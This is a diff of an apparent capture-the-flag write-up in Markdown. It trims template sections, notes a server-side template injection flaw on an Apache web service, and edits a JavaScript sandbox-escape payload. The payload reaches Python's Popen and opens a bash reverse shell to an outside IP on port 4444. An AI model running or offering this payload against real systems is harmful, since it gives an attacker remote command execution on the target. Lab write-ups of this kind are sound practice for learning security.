@@ -8,25 +8,6 @@ tags:
   - javascript
 aliases:
 ---
-# Resolution summary
-
->[!summary]
->- Step 1
->- Step 2
-
-## Improved skills
-
-- Skill 1
-- Skill 2
-
-## Used tools
-
-- nmap
-- gobuster
-
-
----
-
 # Information Gathering
 
 Scanned TCP ports:
@@ -50,26 +31,15 @@ wMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJ
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Enumerated open TCP ports:
-
-```sh
-
-```
-
-Enumerated top 200 UDP ports:
-
-```sh
-
-```
-
 ---
 
 # Enumeration
 
 ## Port 80 - HTTP (Apache)
+Found ssti vulnerable application.
 
 ```javascript
-let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.94/4444 0>&1'";
+let cmd = "bash -c 'bash -i >& /dev/tcp/10.200.22.81/4444 0>&1'";
 let hacked = Object.getOwnPropertyNames({});
 let bymarve = hacked.__getattribute__;
 let n11 = bymarve("__getattribute__");
@@ -90,7 +60,7 @@ function findpopen(o) {
 }
 
 let popen = findpopen(obj);
-let proc = popen(cmd, -1, null, -1, -1, -1, null, null, true);  // shell=True
+let proc = popen(cmd, -1, null, -1, -1, -1, null, null, true); 
 proc.communicate();
 ```
 
